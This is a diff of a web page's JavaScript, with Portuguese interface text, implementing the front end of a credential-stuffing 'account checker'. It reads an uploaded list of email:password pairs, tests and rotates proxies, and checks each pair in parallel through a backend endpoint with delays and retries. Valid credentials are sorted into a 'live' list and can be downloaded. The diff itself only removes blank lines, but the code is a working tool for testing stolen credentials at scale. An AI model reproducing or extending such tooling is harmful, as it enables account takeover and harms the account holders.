@@ -136,7 +136,6 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 </main>
 <script>
 function logout(){fetch('auth.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=logout'}).then(function(){window.location.href='login.html';});}
-
 var zone=document.getElementById('uploadZone');
 var fileInput=document.getElementById('listFile');
 zone.addEventListener('click',function(){fileInput.click();});
@@ -144,15 +143,12 @@ fileInput.addEventListener('change',function(){if(fileInput.files&&fileInput.fil
 zone.addEventListener('dragover',function(e){e.preventDefault();zone.classList.add('dragover');});
 zone.addEventListener('dragleave',function(){zone.classList.remove('dragover');});
 zone.addEventListener('drop',function(e){e.preventDefault();zone.classList.remove('dragover');if(e.dataTransfer.files&&e.dataTransfer.files[0]){fileInput.files=e.dataTransfer.files;document.getElementById('fileName').textContent=e.dataTransfer.files[0].name+' selecionado';document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';}});
-
 var accounts=[],proxies=[],activeProxy='',currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
 var THREADS=2;
 var DELAY_BETWEEN_CHECKS=1500;
 var MAX_FRONTEND_RETRIES=5;
-
 function readFile(file){return new Promise(function(resolve,reject){var reader=new FileReader();reader.onload=function(e){resolve(e.target.result);};reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};reader.readAsText(file);});}
 function sleep(ms){return new Promise(function(resolve){setTimeout(resolve,ms);});}
-
 async function startChecker(){
     if(isRunning)return;
     if(!fileInput.files||fileInput.files.length===0){alert('Selecione um arquivo .txt primeiro.');return;}
@@ -162,7 +158,6 @@ async function startChecker(){
     try{
         proxies=[];activeProxy='';
         try{var res=await fetch('api.php?action=init');var d=await res.json();proxies=d.proxies||[];}catch(e){proxies=[];}
-
         if(proxies.length>0){
             btn.innerHTML='Testando '+proxies.length+' proxies...';
             document.getElementById('statusText').textContent='Testando proxies...';
@@ -189,7 +184,6 @@ async function startChecker(){
                 return;
             }
         }
-
         var text=await readFile(fileInput.files[0]);
         accounts=[];
         var lines=text.split(/\r?\n/);
@@ -204,28 +198,23 @@ async function startChecker(){
                 }
             }
         }
-
         if(!accounts.length){
             alert('Nenhuma conta valida encontrada.');
             btn.disabled=false;
             btn.innerHTML='Iniciar Inspeção';
             return;
         }
-
         document.getElementById('statTotal').textContent=accounts.length;
         document.getElementById('statusText').textContent=accounts.length+' contas carregadas · iniciando...';
         document.getElementById('fileName').textContent=accounts.length+' contas · '+fileInput.files[0].name;
-
         isRunning=true;currentIndex=0;liveCount=0;dieCount=0;allResults=[];
         document.getElementById('liveList').innerHTML='';
         document.getElementById('dieList').innerHTML='';
         updateCounts();
         btn.innerHTML='Inspecionando...';
-
         var workers=[];
         for(var j=0;j<THREADS;j++)workers.push(worker());
         await Promise.all(workers);
-
         document.getElementById('statusText').textContent='Concluido! '+accounts.length+' contas · '+liveCount+' live · '+dieCount+' dead';
         btn.innerHTML='Processo Finalizado';
     }catch(err){
@@ -236,7 +225,6 @@ async function startChecker(){
         isRunning=false;
     }
 }
-
 async function worker(){
     while(currentIndex<accounts.length){
         var idx=currentIndex++;
@@ -250,7 +238,6 @@ async function worker(){
         if(currentIndex<accounts.length){await sleep(DELAY_BETWEEN_CHECKS);}
     }
 }
-
 async function checkAccountWithRetry(email,password,proxy){
     for(var attempt=0;attempt<MAX_FRONTEND_RETRIES;attempt++){
         if(attempt>0){
@@ -265,7 +252,6 @@ async function checkAccountWithRetry(email,password,proxy){
     addToList('dieList',email+':'+password+' · Connection failed (retry esgotado)','die-text');
     updateCounts();
 }
-
 async function checkAccount(email,password,proxy){
     var fd=new FormData();
     fd.append('email',email);
@@ -293,7 +279,6 @@ async function checkAccount(email,password,proxy){
         return 'connection_failed';
     }
 }
-
 function addToList(id,text,cls){var el=document.getElementById(id);var div=document.createElement('div');div.className=cls;div.textContent=text;el.appendChild(div);el.scrollTop=el.scrollHeight;}
 function updateCounts(){document.getElementById('liveCount').textContent=liveCount;document.getElementById('dieCount').textContent=dieCount;document.getElementById('statLive').textContent=liveCount;document.getElementById('statDie').textContent=dieCount;}
 function downloadResults(type){var filtered=type==='lives'?allResults.filter(function(r){return r.status==='live';}):allResults.filter(function(r){return r.status!=='live';});if(filtered.length===0){alert('Nenhum resultado para exportar');return;}var text=filtered.map(function(r){return r.email+':'+r.password;}).join('\n');var blob=new Blob([text],{type:'text/plain'});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=type+'.txt';document.body.appendChild(a);a.click();document.body.removeChild(a);}
